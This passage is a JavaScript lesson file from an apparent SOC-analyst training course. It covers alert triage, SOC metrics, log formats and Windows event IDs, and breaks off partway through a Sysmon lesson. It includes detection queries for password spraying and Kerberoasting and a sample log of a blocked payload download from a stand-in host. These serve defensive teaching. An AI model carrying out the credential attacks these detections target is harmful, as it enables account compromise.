// CyberPath lessons — Phase 2 (SOC Analyst) and Phase 3 (IR, Threat Intel & DFIR)
window.CP = window.CP || {};
CP.lessons = CP.lessons || [];

/* ===================== p2-m1 Inside the SOC ===================== */
CP.lessons.push(
{
  id: "p2-m1-l1",
  module: "p2-m1",
  title: "What a SOC Is and Who Works There",
  minutes: 15,
  objectives: [
    "Describe the mission of a Security Operations Center and the services it delivers",
    "Distinguish Tier 1, Tier 2 and Tier 3 analyst responsibilities and adjacent roles",
    "Compare in-house, MSSP, MDR and hybrid SOC models",
    "Explain what happens during a typical shift, including handover"
  ],
  html: `
<p>A <b>Security Operations Center (SOC)</b> is the team, process and technology that watches an organization's environment around the clock, detects malicious activity, and coordinates the response. If the security program is the immune system, the SOC is the part that notices the fever and decides whether it is a cold or something worse. Almost every entry-level blue-team job title &mdash; SOC Analyst, Security Analyst I, Cyber Defense Analyst, Security Monitoring Analyst &mdash; lives here.</p>

<h3>Core SOC services</h3>
<ul>
  <li><b>Monitoring and triage</b> &mdash; reviewing alerts from the SIEM, EDR, email security, identity and cloud tools, and deciding which ones matter.</li>
  <li><b>Incident response</b> &mdash; containing, investigating and coordinating recovery from confirmed incidents.</li>
  <li><b>Detection engineering</b> &mdash; writing, testing and tuning the rules that generate alerts.</li>
  <li><b>Threat hunting</b> &mdash; proactively searching for attackers who did not trigger an alert.</li>
  <li><b>Threat intelligence</b> &mdash; tracking adversaries, enriching alerts, and feeding indicators to tools.</li>
  <li><b>Vulnerability and exposure awareness</b> &mdash; many SOCs also own or support scanning, attack surface monitoring and patch verification.</li>
</ul>

<h3>The tier model</h3>
<table>
  <tr><th>Role</th><th>Typical work</th><th>Typical experience</th></tr>
  <tr><td><b>Tier 1 &ndash; Triage analyst</b></td><td>Works the alert queue, validates alerts, enriches indicators, closes false positives with notes, escalates real issues using runbooks.</td><td>0&ndash;2 years; Security+, CySA+, BTL1, SC-200</td></tr>
  <tr><td><b>Tier 2 &ndash; Incident responder</b></td><td>Deep investigation of escalations, scoping across hosts and users, containment actions (isolate host, disable account), writes incident reports.</td><td>2&ndash;5 years</td></tr>
  <tr><td><b>Tier 3 &ndash; Senior / hunter / DFIR</b></td><td>Threat hunting, forensics, malware analysis, handling major incidents, mentoring.</td><td>5+ years</td></tr>
  <tr><td><b>Detection engineer</b></td><td>Builds and maintains detections as code, measures coverage against MITRE ATT&amp;CK.</td><td>Varies; strong query and scripting skills</td></tr>
  <tr><td><b>SOC manager / lead</b></td><td>Staffing, metrics, escalation authority, communication with leadership.</td><td>Senior</td></tr>
</table>
<p>Modern SOCs increasingly blur the tiers. Many teams run a "pod" or "detection and response" model where every analyst triages <i>and</i> investigates end to end, with automation (SOAR and AI assistants) absorbing the most repetitive Tier 1 work. That does not remove entry-level jobs; it changes them toward investigation, judgment and documentation rather than clicking "close" on noise.</p>

<h3>SOC operating models</h3>
<ul>
  <li><b>In-house SOC</b> &mdash; the organization employs its own analysts. Most context, most control, highest cost.</li>
  <li><b>MSSP (Managed Security Service Provider)</b> &mdash; a provider monitors your logs, typically notifying you of alerts rather than acting.</li>
  <li><b>MDR (Managed Detection and Response)</b> &mdash; a provider that monitors <i>and</i> takes response actions (isolating hosts, disabling accounts) usually via your EDR.</li>
  <li><b>Hybrid / co-managed</b> &mdash; internal staff handle business-hours escalations; a provider covers nights and weekends. Very common in mid-size companies.</li>
</ul>

<div class="callout real"><b>On the job:</b> If you start at an MSSP or MDR, you will see many customers' environments in a single week. That is brutal but excellent training: you learn dozens of tool stacks fast. The trade-off is less business context &mdash; you may not know that "svc_backup" logging in at 2 a.m. is normal for one client and alarming for another, so read each customer's notes carefully.</div>

<h3>A day on shift</h3>
<ol>
  <li><b>Handover.</b> Read the previous shift's notes: open incidents, hosts under watch, ongoing maintenance windows, any "do not close" tickets.</li>
  <li><b>Queue review.</b> Sort the alert queue by severity and age. Critical and high alerts are worked first, but watch SLAs on older mediums.</li>
  <li><b>Triage and investigate.</b> For each alert: understand what fired, gather context, decide true positive, benign true positive or false positive, and document.</li>
  <li><b>Escalate</b> according to runbooks &mdash; to Tier 2, the on-call incident commander, or the customer.</li>
  <li><b>Background tasks</b> between alerts: tuning suggestions, threat intel reading, small hunts, improving runbooks.</li>
  <li><b>Handover out.</b> Write clear notes so the next shift does not have to rediscover what you learned.</li>
</ol>

<div class="callout tip"><b>Tip:</b> Your ticket notes are your reputation. A good note answers: what fired, what you checked, what you found, what you concluded, and what you did. "Closed &ndash; FP" with nothing else is the fastest way to lose trust from Tier 2.</div>

<h3>The tooling stack you will touch</h3>
<p>Expect a <b>SIEM</b> (Splunk, Microsoft Sentinel, Google SecOps, Elastic, QRadar), an <b>EDR/XDR</b> (Microsoft Defender XDR, CrowdStrike Falcon, SentinelOne), <b>email security</b> (Defender for Office 365, Proofpoint, Mimecast), an <b>identity provider</b> (Microsoft Entra ID, Okta), a <b>ticketing/case system</b> (ServiceNow, Jira, the SIEM's own incident queue), a <b>SOAR</b> platform, and threat intel lookups (VirusTotal, AbuseIPDB, urlscan.io, internal TIP such as MISP). You do not need to master all of them before your first job, but you must understand the concepts each represents.</p>

<div class="callout exam"><b>Exam alignment:</b> CySA+ CS0-003 Domain 1 (Security Operations, 33%) expects you to know SOC functions, tooling categories and the value of process standardization. BTL1's SOC fundamentals and incident response sections test the same tier model and the triage mindset.</div>
`,
  keyTerms: [
    ["SOC", "Security Operations Center: people, process and technology for continuous monitoring, detection and response"],
    ["Tier 1 analyst", "Front-line analyst who triages alerts, enriches and escalates using runbooks"],
    ["Tier 2 analyst", "Incident responder who performs deeper investigation, scoping and containment"],
    ["MSSP", "Managed Security Service Provider: outsourced monitoring that typically notifies rather than acts"],
    ["MDR", "Managed Detection and Response: outsourced monitoring plus hands-on response actions"],
    ["Runbook", "Step-by-step procedure for handling a specific alert type"],
    ["Shift handover", "Structured transfer of open work and context between shifts"],
    ["Escalation", "Passing an alert or incident to a higher tier or authority per defined criteria"]
  ],
  standards: ["NIST SP 800-61 Rev. 3", "NIST CSF 2.0"],
  labs: ["lab-alert-triage"]
},
{
  id: "p2-m1-l2",
  module: "p2-m1",
  title: "The Alert Triage Workflow",
  minutes: 20,
  objectives: [
    "Classify alerts as true positive, benign true positive, false positive or false negative",
    "Apply a repeatable triage workflow with the five core questions",
    "Assign severity using impact and urgency",
    "Write an investigation note that another analyst can trust"
  ],
  html: `
<p>Triage is the single most important Tier 1 skill. An alert is a <i>hypothesis</i> generated by a rule: "something that looks like X happened." Your job is to prove or disprove it quickly, consistently and with evidence.</p>

<h3>Alert outcomes</h3>
<table>
  <tr><th>Outcome</th><th>Meaning</th><th>Example</th></tr>
  <tr><td><b>True positive (TP)</b></td><td>The rule fired and the activity is malicious.</td><td>Encoded PowerShell downloading a Cobalt Strike beacon.</td></tr>
  <tr><td><b>Benign true positive (BTP)</b></td><td>The rule correctly detected the behavior, but it is authorized.</td><td>The red team ran Mimikatz during an approved test; IT ran PsExec for a patch push.</td></tr>
  <tr><td><b>False positive (FP)</b></td><td>The rule fired on something that does not match its intent.</td><td>"Brute force" alert caused by a misconfigured service account with an expired password.</td></tr>
  <tr><td><b>False negative (FN)</b></td><td>Malicious activity occurred and no alert fired.</td><td>Discovered later during a hunt or via an external notification.</td></tr>
</table>
<p>Tracking BTP separately from FP matters: a BTP means the detection works and you may want a scoped exception; an FP means the logic needs fixing.</p>

<h3>The five triage questions</h3>
<ol>
  <li><b>What exactly fired?</b> Read the rule name, description and the raw event(s). Do not trust the alert title alone.</li>
  <li><b>Who and what is involved?</b> User, host, IP, process, file hash. Is the user privileged? Is the host a domain controller or a kiosk?</li>
  <li><b>Is it expected?</b> Check the asset inventory, change tickets, known admin tools, and previous tickets for the same entity.</li>
  <li><b>What else happened around it?</b> Pivot &plusmn;15&ndash;60 minutes on the same host and user. Look for the before (initial access) and the after (execution, persistence, lateral movement).</li>
  <li><b>What is the impact and what do I do next?</b> Close with justification, monitor, contain per runbook, or escalate.</li>
</ol>

<h3>Worked example</h3>
<p>Alert: <i>"Multiple failed logons followed by success &ndash; user j.ortiz."</i> Raw events from the SIEM:</p>
<pre><code>2026-10-14T02:11:03Z EventID=4625 TargetUserName=j.ortiz LogonType=3 IpAddress=185.220.101.47 Status=0xC000006A
... (37 more 4625 events in 90 seconds) ...
2026-10-14T02:12:41Z EventID=4624 TargetUserName=j.ortiz LogonType=3 IpAddress=185.220.101.47 AuthenticationPackageName=NTLM</code></pre>
<p>Answers: 0xC000006A means <i>bad password</i> for a valid user. The source IP is external and belongs to a known Tor exit range (enrich with AbuseIPDB or your TI platform). A Type 3 (network) NTLM logon succeeded from the internet &mdash; which itself means something is exposed that should not be. This is a <b>true positive, high severity</b>: escalate, disable or reset the account per runbook, and identify which internet-facing service accepted the logon.</p>

<h3>Severity: impact &times; urgency</h3>
<p>Most SOCs map severity from two inputs: <b>impact</b> (asset criticality, data sensitivity, privilege of the account) and <b>urgency/confidence</b> (is the attack active, is it spreading, how confident is the detection). A suspicious login on a domain admin account outranks malware quarantined successfully on a lab VM.</p>
<table>
  <tr><th></th><th>Low impact</th><th>High impact</th></tr>
  <tr><td><b>Low urgency</b></td><td>Low</td><td>Medium</td></tr>
  <tr><td><b>High urgency</b></td><td>Medium/High</td><td>Critical</td></tr>
</table>

<div class="callout warn"><b>Warning:</b> Never close an alert just because the EDR says "blocked" or "remediated." Ask how the file got there. A blocked payload means the delivery mechanism (phishing email, compromised account, vulnerable service) may still be live and the attacker will try again with something else.</div>

<h3>Writing the note</h3>
<pre><code>Summary: 38 failed NTLM logons (0xC000006A) then success for j.ortiz from 185.220.101.47 (Tor exit, AbuseIPDB 100%).
Checks: user is Finance, not admin; no change ticket; no VPN session; host logged = EXCH01 (OWA exposed).
Related: same IP attempted 14 other accounts (spray) 01:55-02:12Z, no other successes.
Verdict: True Positive - credential compromise via password spray. Severity HIGH.
Actions: escalated to IR on-call 02:31Z; account disabled + sessions revoked per RB-007; IP blocked at edge.
Next: IR to review mailbox rules and OAuth grants for j.ortiz.</code></pre>

<div class="callout real"><b>On the job:</b> Many SOCs measure Tier 1 on <i>accuracy</i> of escalations as much as speed. Escalating everything wastes Tier 2's time; escalating nothing is dangerous. When unsure, escalate with a clear question ("Is PsExec from this jump host expected?") rather than a vague "please check."</div>

<div class="callout exam"><b>Exam alignment:</b> CySA+ CS0-003 objectives 1.5 and 2.x ask you to determine whether activity is malicious from logs and to prioritize. Expect scenario questions where the "BEST next step" is to gather more context, not to immediately wipe the host. BTL1 tests the TP/FP distinction directly.</div>
`,
  keyTerms: [
    ["True positive", "Alert correctly identified malicious activity"],
    ["Benign true positive", "Alert correctly detected the behavior but it was authorized or expected"],
    ["False positive", "Alert fired on activity that does not match the rule's intent"],
    ["False negative", "Malicious activity that produced no alert"],
    ["Enrichment", "Adding context (reputation, geolocation, asset owner) to an indicator or alert"],
    ["Pivoting", "Using one data point (user, host, IP) to search for related activity"],
    ["Severity", "Priority rating derived from impact and urgency"],
    ["0xC000006A", "Windows logon failure status: valid username, wrong password"]
  ],
  standards: ["NIST SP 800-61 Rev. 3"],
  labs: ["lab-alert-triage", "lab-log-bruteforce"]
},
{
  id: "p2-m1-l3",
  module: "p2-m1",
  title: "SOC Metrics, Alert Fatigue and SOAR",
  minutes: 18,
  objectives: [
    "Define MTTD, MTTA, MTTR and dwell time and explain how they are measured",
    "Recognize the causes and consequences of alert fatigue",
    "Describe how SOAR playbooks automate enrichment and response",
    "Evaluate where AI assistants help and where human judgment is required"
  ],
  html: `
<p>A SOC that cannot measure itself cannot improve. Metrics tell leadership whether the investment works and tell analysts where the pain is. But metrics can also be gamed &mdash; a team rewarded only on "tickets closed per hour" will close tickets, not catch attackers.</p>

<h3>Core time metrics</h3>
<table>
  <tr><th>Metric</th><th>Measures</th><th>Clock starts &rarr; stops</th></tr>
  <tr><td><b>MTTD</b> &ndash; Mean Time to Detect</td><td>How long attackers operate before you notice</td><td>Malicious activity begins &rarr; alert/detection</td></tr>
  <tr><td><b>MTTA</b> &ndash; Mean Time to Acknowledge</td><td>Queue responsiveness</td><td>Alert created &rarr; analyst picks it up</td></tr>
  <tr><td><b>MTTR</b> &ndash; Mean Time to Respond/Remediate</td><td>Speed of containment and fix</td><td>Detection &rarr; containment (or full remediation &mdash; define which!)</td></tr>
  <tr><td><b>Dwell time</b></td><td>Total attacker time in the environment</td><td>Initial compromise &rarr; eviction</td></tr>
</table>
<p>Industry reports (Mandiant M-Trends, Sophos, IBM Cost of a Data Breach) have shown global median dwell time falling to roughly 10&ndash;11 days in recent years, largely because ransomware actors announce themselves. Stealthy espionage intrusions still last months. Because means are skewed by a few long incidents, mature SOCs report <b>medians and percentiles</b> (P90) alongside means.</p>

<h3>Quality metrics</h3>
<ul>
  <li><b>True positive rate per rule</b> &mdash; rules that are 99% FP are candidates for tuning or retirement.</li>
  <li><b>Escalation accuracy</b> &mdash; what fraction of Tier 1 escalations Tier 2 agreed were real.</li>
  <li><b>ATT&amp;CK coverage</b> &mdash; techniques with validated detections (tested via Atomic Red Team or purple teaming).</li>
  <li><b>Alerts per analyst per shift</b> &mdash; a workload and burnout indicator.</li>
  <li><b>Automation rate</b> &mdash; percentage of alerts enriched or closed by automation.</li>
</ul>

<h3>Alert fatigue</h3>
<p><b>Alert fatigue</b> is the desensitization that happens when analysts face more alerts than they can meaningfully investigate, most of them noise. Symptoms: rubber-stamp closures, real alerts missed in the flood, high turnover. Famous breaches (Target 2013 is the classic case study) involved alerts that fired but were not acted on.</p>
<p>Causes and fixes:</p>
<ul>
  <li><b>Untuned vendor rules</b> &rarr; tune with scoped exclusions, raise thresholds, add context conditions.</li>
  <li><b>Duplicate alerts</b> from multiple tools for the same event &rarr; correlate into a single incident (Sentinel and Defender XDR do this natively).</li>
  <li><b>Low-fidelity, high-volume signals</b> (e.g., every port scan) &rarr; convert to risk-based alerting: assign risk scores to entities and only alert when a user or host accumulates enough risk (Splunk RBA is the well-known implementation).</li>
  <li><b>No feedback loop</b> &rarr; every FP closure should feed a tuning request.</li>
</ul>

<div class="callout tip"><b>Tip:</b> When you close a false positive, add one line: "Tuning suggestion: exclude parent process X on host group Y." Detection engineers love analysts who do this, and it is a great talking point in interviews and promotions.</div>

<h3>SOAR: Security Orchestration, Automation and Response</h3>
<p>SOAR platforms (Splunk SOAR, Microsoft Sentinel playbooks built on Logic Apps, Palo Alto Cortex XSOAR, Google SecOps SOAR, Tines, Torq) connect your tools through APIs and run <b>playbooks</b>. A typical phishing playbook:</p>
<ol>
  <li>User reports an email via the "Report phish" button.</li>
  <li>Playbook extracts sender, URLs, attachments and headers.</li>
  <li>Enriches: URL reputation, detonation in a sandbox, sender domain age, SPF/DKIM/DMARC results.</li>
  <li>If verdict is malicious: searches all mailboxes for the same message, soft-deletes copies, blocks the sender and URL, and opens an incident.</li>
  <li>Notifies the reporter with a thank-you and verdict.</li>
  <li>If inconclusive: assigns to an analyst with all enrichment pre-attached.</li>
</ol>
<p>Automation should be strongest where actions are <b>reversible and well understood</b> (enrichment, quarantining an email, tagging) and gated by <b>human approval</b> where they are disruptive (isolating a production server, disabling an executive's account).</p>

<h3>AI in the SOC (2026 reality)</h3>
<p>Generative AI assistants (Microsoft Security Copilot, Google Gemini in Security Operations, CrowdStrike Charlotte AI and similar) are now common. They summarize incidents, translate natural language into KQL or SPL, explain unfamiliar command lines and draft reports. "Agentic" triage features attempt to investigate and propose verdicts on phishing and identity alerts autonomously. Treat their output as a junior colleague's draft: verify queries return what you think, check that cited events exist, and never paste sensitive data into unapproved tools.</p>

<div class="callout warn"><b>Warning:</b> Automation amplifies mistakes. A playbook that auto-blocks any IP seen in a "malicious" feed can block your own CDN or a cloud provider range and cause an outage. Always build allowlists and rate limits into automated response.</div>

<div class="callout exam"><b>Exam alignment:</b> CySA+ CS0-003 objective 1.5 covers process improvement: standardization, automation, SOAR, and metrics such as MTTD and MTTR. Expect questions on which tasks are good automation candidates and on reducing false positives.</div>
`,
  keyTerms: [
    ["MTTD", "Mean Time to Detect: average time from malicious activity starting to detection"],
    ["MTTR", "Mean Time to Respond/Remediate: average time from detection to containment or fix"],
    ["MTTA", "Mean Time to Acknowledge: time from alert creation to analyst pickup"],
    ["Dwell time", "Total time an attacker is present before eviction"],
    ["Alert fatigue", "Desensitization caused by excessive, low-quality alerts"],
    ["Risk-based alerting", "Aggregating risk scores per entity and alerting on accumulated risk instead of single events"],
    ["SOAR", "Security Orchestration, Automation and Response: platforms that run automated playbooks across tools"],
    ["Playbook", "Automated or documented workflow for a class of incident"]
  ],
  standards: ["NIST SP 800-61 Rev. 3"],
  labs: ["lab-alert-triage"]
}
);

/* ===================== p2-m2 Log Sources & Log Analysis ===================== */
CP.lessons.push(
{
  id: "p2-m2-l1",
  module: "p2-m2",
  title: "Log Fundamentals: Formats, Syslog and Time",
  minutes: 16,
  objectives: [
    "Explain why logs are the primary evidence source for a SOC",
    "Read syslog (RFC 5424), JSON, CEF and key=value log formats",
    "Explain normalization and why time synchronization and UTC matter",
    "Identify the log sources with the highest detection value"
  ],
  html: `
<p>Every alert you will ever triage started life as a log line. Logs are the SOC's eyes: if a system does not log an action, or the log never reaches the SIEM, that action is invisible. Understanding where logs come from, how they are structured and what can go wrong with them is foundational.</p>

<h3>Common formats</h3>
<h4>Syslog (RFC 5424)</h4>
<pre><code>&lt;38&gt;1 2026-10-14T09:22:41.003Z web01 sshd 2211 - - Failed password for invalid user admin from 203.0.113.50 port 51122 ssh2</code></pre>
<p>The <code>&lt;38&gt;</code> is the <b>PRI</b> value = facility &times; 8 + severity. 38 = facility 4 (auth) &times; 8 + severity 6 (informational). Then: version, timestamp, hostname, app-name, procid, msgid, structured data, message. Older devices still send the BSD-style RFC 3164 format with no year and no time zone &mdash; a constant source of parsing pain. Syslog traditionally travels on UDP/514 (unreliable, unencrypted); prefer TCP/6514 with TLS (RFC 5425).</p>

<h4>JSON (cloud and modern apps)</h4>
<pre><code>{"eventTime":"2026-10-14T09:25:10Z","eventName":"ConsoleLogin","sourceIPAddress":"198.51.100.23",
 "userIdentity":{"type":"IAMUser","userName":"deploy-bot"},"responseElements":{"ConsoleLogin":"Success"},
 "additionalEventData":{"MFAUsed":"No"}}</code></pre>
<p>This is an AWS CloudTrail event &mdash; a console login without MFA for an account that sounds like a bot. That alone is worth a look.</p>

<h4>CEF and key=value</h4>
<pre><code>CEF:0|PaloAltoNetworks|PAN-OS|11.1|THREAT|url|5|src=10.1.4.22 dst=104.21.8.9 suser=corp\\mlee request=hxxp://bad.example/payload.bin act=block-url</code></pre>
<p>Common Event Format (CEF) and LEEF are vendor-neutral formats favored by firewalls and proxies forwarding to SIEMs.</p>

<h3>Normalization</h3>
<p>Ten products might call the source address <code>src</code>, <code>src_ip</code>, <code>SourceIP</code>, <code>client.ip</code> or <code>IpAddress</code>. A SIEM <b>parses</b> raw events into fields and <b>normalizes</b> them to a common schema so one query works across sources. Splunk uses the <b>Common Information Model (CIM)</b>, Microsoft Sentinel uses <b>ASIM</b> (Advanced Security Information Model), Elastic uses <b>ECS</b>, and the vendor-neutral <b>OCSF</b> (Open Cybersecurity Schema Framework) is increasingly adopted by security data lakes such as Amazon Security Lake.</p>

<h3>Time is evidence</h3>
<ul>
  <li><b>Synchronize clocks</b> with NTP. A domain controller five minutes off makes correlation unreliable and can break Kerberos (default tolerance is 5 minutes).</li>
  <li><b>Store and query in UTC.</b> Convert to local time only for presentation. Mixed time zones are the most common timeline error in investigations.</li>
  <li><b>Know the difference</b> between event time (when it happened) and ingest time (when the SIEM received it). Agents that buffer while offline can deliver events hours late &mdash; in Sentinel compare <code>TimeGenerated</code> with <code>_TimeReceived</code>; in Splunk compare <code>_time</code> with <code>_indextime</code>.</li>
</ul>

<div class="callout warn"><b>Warning:</b> A detection rule that looks back 5 minutes will silently miss events that arrive 20 minutes late. Ingestion delay is a real cause of false negatives. If a source is often delayed, widen the rule's lookback or schedule it with an offset.</div>

<h3>Highest-value log sources</h3>
<table>
  <tr><th>Source</th><th>What it reveals</th></tr>
  <tr><td>Identity (Active Directory, Entra ID, Okta)</td><td>Logons, MFA, account changes, risky sign-ins &mdash; most modern intrusions are identity-based</td></tr>
  <tr><td>EDR / Sysmon</td><td>Process creation, command lines, network connections per process, file and registry changes</td></tr>
  <tr><td>Email security</td><td>Phishing delivery, clicks, attachments</td></tr>
  <tr><td>Firewall, proxy, DNS</td><td>Outbound C2, exfiltration, connections to known-bad infrastructure</td></tr>
  <tr><td>Cloud control plane (CloudTrail, Azure Activity, GCP Audit)</td><td>Who created, changed or deleted cloud resources</td></tr>
  <tr><td>VPN and remote access</td><td>Where and when users connect; impossible travel</td></tr>
  <tr><td>Web server and WAF</td><td>Exploitation attempts, web shells</td></tr>
</table>

<div class="callout real"><b>On the job:</b> Logging is expensive &mdash; SIEMs are often billed per GB ingested. Teams therefore make deliberate choices, sending high-value, low-volume data (identity, EDR alerts, DNS) to the "hot" analytics tier and verbose data (full firewall allow logs, NetFlow) to cheaper data-lake tiers (Sentinel data lake / Auxiliary logs, Splunk federated search to S3). Know which tier your data is in &mdash; some do not support real-time alerting.</div>

<div class="callout exam"><b>Exam alignment:</b> CySA+ CS0-003 objective 1.1 covers log ingestion, time synchronization and logging levels; 1.2 asks you to analyze indicators in logs. BTL1's SIEM domain tests syslog fields and log source selection.</div>
`,
  keyTerms: [
    ["Syslog", "Standard protocol and format for event messages (RFC 5424; legacy RFC 3164)"],
    ["PRI", "Syslog priority value = facility x 8 + severity"],
    ["CEF", "Common Event Format, a vendor-neutral log format used by many security devices"],
    ["Normalization", "Mapping differently named fields from many sources to a common schema"],
    ["CIM / ASIM / ECS / OCSF", "Normalization schemas for Splunk, Sentinel, Elastic, and vendor-neutral data lakes"],
    ["NTP", "Network Time Protocol, used to synchronize clocks for reliable correlation"],
    ["Ingestion delay", "Lag between when an event occurs and when the SIEM indexes it"]
  ],
  standards: ["RFC 5424", "RFC 5425", "RFC 3164", "NIST SP 800-92"],
  labs: ["lab-log-bruteforce"]
},
{
  id: "p2-m2-l2",
  module: "p2-m2",
  title: "Windows Security Event Logs Every Analyst Must Know",
  minutes: 25,
  objectives: [
    "Interpret Event IDs 4624, 4625, 4634, 4648, 4672, 4688, 4720, 4728/4732, 4740, 4768/4769/4771, 4776, 7045 and 1102",
    "Use logon types and failure status codes to explain what happened",
    "Recognize event patterns for brute force, password spraying and Kerberoasting",
    "Know which audit policies must be enabled for key events to exist"
  ],
  html: `
<p>Windows is still the center of most enterprise networks, and Active Directory is the attacker's favorite target. The Security event log, collected from domain controllers and endpoints, answers "who logged on where, how, and what did they change?"</p>

<h3>Logon events</h3>
<table>
  <tr><th>Event ID</th><th>Meaning</th></tr>
  <tr><td><b>4624</b></td><td>Successful logon</td></tr>
  <tr><td><b>4625</b></td><td>Failed logon</td></tr>
  <tr><td><b>4634 / 4647</b></td><td>Logoff / user-initiated logoff</td></tr>
  <tr><td><b>4648</b></td><td>Logon with explicit credentials (runas, or a tool passing creds &mdash; common in lateral movement)</td></tr>
  <tr><td><b>4672</b></td><td>Special privileges assigned to new logon (admin-equivalent logon)</td></tr>
</table>

<h4>Logon types (the field that tells the story)</h4>
<table>
  <tr><th>Type</th><th>Name</th><th>Typical cause</th></tr>
  <tr><td>2</td><td>Interactive</td><td>Keyboard at the console</td></tr>
  <tr><td>3</td><td>Network</td><td>SMB file share, PsExec, many lateral movement tools</td></tr>
  <tr><td>4</td><td>Batch</td><td>Scheduled tasks</td></tr>
  <tr><td>5</td><td>Service</td><td>Service started under an account</td></tr>
  <tr><td>7</td><td>Unlock</td><td>Workstation unlocked</td></tr>
  <tr><td>8</td><td>NetworkCleartext</td><td>Credentials sent in cleartext (IIS basic auth) &mdash; investigate</td></tr>
  <tr><td>9</td><td>NewCredentials</td><td><code>runas /netonly</code>; also a classic pass-the-hash indicator (with LogonProcess seclogo)</td></tr>
  <tr><td>10</td><td>RemoteInteractive</td><td>RDP</td></tr>
  <tr><td>11</td><td>CachedInteractive</td><td>Cached domain creds, laptop off network</td></tr>
</table>

<h4>4625 status / sub-status codes</h4>
<table>
  <tr><th>Code</th><th>Meaning</th></tr>
  <tr><td>0xC0000064</td><td>Username does not exist (attacker guessing names)</td></tr>
  <tr><td>0xC000006A</td><td>Correct username, wrong password</td></tr>
  <tr><td>0xC0000234</td><td>Account locked out</td></tr>
  <tr><td>0xC0000072</td><td>Account disabled</td></tr>
  <tr><td>0xC000006F / 0xC0000070</td><td>Outside allowed hours / unauthorized workstation</td></tr>
  <tr><td>0xC0000071 / 0xC0000224</td><td>Password expired / must change password</td></tr>
</table>

<h3>Account and group management</h3>
<ul>
  <li><b>4720</b> user account created; <b>4722</b> enabled; <b>4724</b> password reset attempt; <b>4726</b> deleted; <b>4738</b> changed.</li>
  <li><b>4728</b> member added to a security-enabled <i>global</i> group (e.g., Domain Admins); <b>4732</b> added to a <i>local</i> group (e.g., Administrators); <b>4756</b> universal group (e.g., Enterprise Admins).</li>
  <li><b>4740</b> account locked out (logged on the DC, includes the caller computer name &mdash; great for finding the source of lockouts).</li>
</ul>
<p>A new account (4720) followed within minutes by addition to Domain Admins (4728) at 3 a.m. is one of the clearest persistence signals there is.</p>

<h3>Kerberos and NTLM</h3>
<ul>
  <li><b>4768</b> Kerberos TGT requested (AS-REQ). Failure code 0x18 = bad password. Pre-auth type 0 suggests <b>AS-REP roasting</b>.</li>
  <li><b>4769</b> Kerberos service ticket requested (TGS-REQ). Many requests for different SPNs with <b>Ticket Encryption Type 0x17 (RC4-HMAC)</b> from one user is the classic <b>Kerberoasting</b> pattern.</li>
  <li><b>4771</b> Kerberos pre-authentication failed &mdash; password spraying against Kerberos shows up here, not as 4625 on the DC.</li>
  <li><b>4776</b> NTLM credential validation on the DC.</li>
</ul>

<h3>Process, service and log tampering</h3>
<ul>
  <li><b>4688</b> new process created. Only includes the full command line if "Include command line in process creation events" is enabled via Group Policy &mdash; turn it on.</li>
  <li><b>4698</b> scheduled task created (Security log); <b>7045</b> new service installed (System log) &mdash; PsExec, many RATs and ransomware install services.</li>
  <li><b>1102</b> the Security audit log was cleared. <b>104</b> in the System log means another log was cleared. Legitimate clears are rare; treat as high priority.</li>
</ul>

<h3>Queries: password spray detection</h3>
<p>Spraying = few passwords against many accounts, so look for one source failing against many distinct users.</p>
<h4>Splunk SPL</h4>
<pre><code>index=wineventlog EventCode=4625
| stats dc(TargetUserName) AS users, count AS attempts, values(Sub_Status) AS codes BY IpAddress
| where users &gt; 15
| sort - users</code></pre>
<h4>Microsoft Sentinel KQL</h4>
<pre><code>SecurityEvent
| where TimeGenerated &gt; ago(1h) and EventID == 4625
| summarize Users = dcount(TargetUserName), Attempts = count(), Codes = make_set(SubStatus) by IpAddress
| where Users &gt; 15
| order by Users desc</code></pre>
<h4>Kerberoasting (KQL)</h4>
<pre><code>SecurityEvent
| where EventID == 4769
| where TicketEncryptionType == "0x17"
| where ServiceName !endswith "$" and ServiceName != "krbtgt"
| summarize SPNs = dcount(ServiceName) by TargetUserName, IpAddress, bin(TimeGenerated, 10m)
| where SPNs &gt; 5</code></pre>

<div class="callout warn"><b>Warning:</b> Events only exist if auditing is configured. Many environments still lack "Audit Process Creation," "Audit Kerberos Service Ticket Operations," or "Audit Security Group Management." If a query returns nothing, verify the event is being generated and forwarded before concluding "no activity."</div>

<div class="callout tip"><b>Tip:</b> Memorize this short list first: 4624, 4625, 4648, 4672, 4688, 4720, 4728, 4732, 4740, 4769, 7045, 1102. They appear constantly in interviews and exams.</div>

<div class="callout exam"><b>Exam alignment:</b> BTL1 and CySA+ CS0-003 (objective 1.2, indicators of malicious activity) both present raw Windows events and ask what happened. Logon type 10 = RDP, type 3 = network, 1102 = log cleared are frequent targets.</div>
`,
  keyTerms: [
    ["4624 / 4625", "Successful / failed logon events"],
    ["Logon Type 3", "Network logon (SMB, PsExec); Type 10 is RDP; Type 9 can indicate pass-the-hash"],
    ["4688", "Process creation event; needs command-line auditing enabled for full value"],
    ["4720 / 4728 / 4732", "User created / added to global group / added to local group"],
    ["4769", "Kerberos service ticket request; RC4 (0x17) bursts indicate Kerberoasting"],
    ["7045", "New service installed (System log), common for PsExec and malware persistence"],
    ["1102", "Security audit log cleared, a strong anti-forensics indicator"],
    ["Password spraying", "Trying a few common passwords across many accounts to avoid lockout"]
  ],
  standards: ["MITRE ATT&CK T1110.003", "MITRE ATT&CK T1558.003", "MITRE ATT&CK T1070.001"],
  labs: ["lab-windows-events", "lab-log-bruteforce"]
},
{
  id: "p2-m2-l3",
  module: "p2-m2",
  title: "Sysmon and PowerShell Logging",
  minutes: 20,
  objectives: [
    "Explain what Sysmon adds beyond native Windows logging",
    "Interpret key Sysmon Event IDs 1, 3, 7, 8, 10, 11, 12-14, 22, 23 and 25",
    "Enable and read PowerShell Script Block Logging (4104) and Module Logging (4103)",
    "Spot suspicious PowerShell patterns including encoded commands and download cradles"
  ],
  html: `
<p><b>Sysmon</b> (System Monitor, part of Microsoft Sysinternals) is a free driver and service that logs rich endpoint telemetry to <code>Microsoft-Windows-Sysmon/Operational</code>. It is controlled by an XML configuration; community baselines such as SwiftOnSecurity's sysmon-config and Olaf Hartong's sysmon-modular are widely used starting points. Microsoft has also announced native Sysmon functionality built into Windows 11 and Windows Server 2025, so expect it to become a standard optional feature.</p>

<h3>Sysmon Event IDs you will use</h3>
<table>
  <tr><th>ID</th><th>Event</th><th>Why it matters</th></tr>
  <tr><td><b>1</b></td><td>Process creation</td><td>Full command line, hashes, parent process, user, integrity level</td></tr>
  <tr><td><b>3</b></td><td>Network connection</td><td>Which <i>process</i> connected to which IP/port</td></tr>
  <tr><td>5</td><td>Process terminated</td><td>Lifetime of short-lived tools</td></tr>
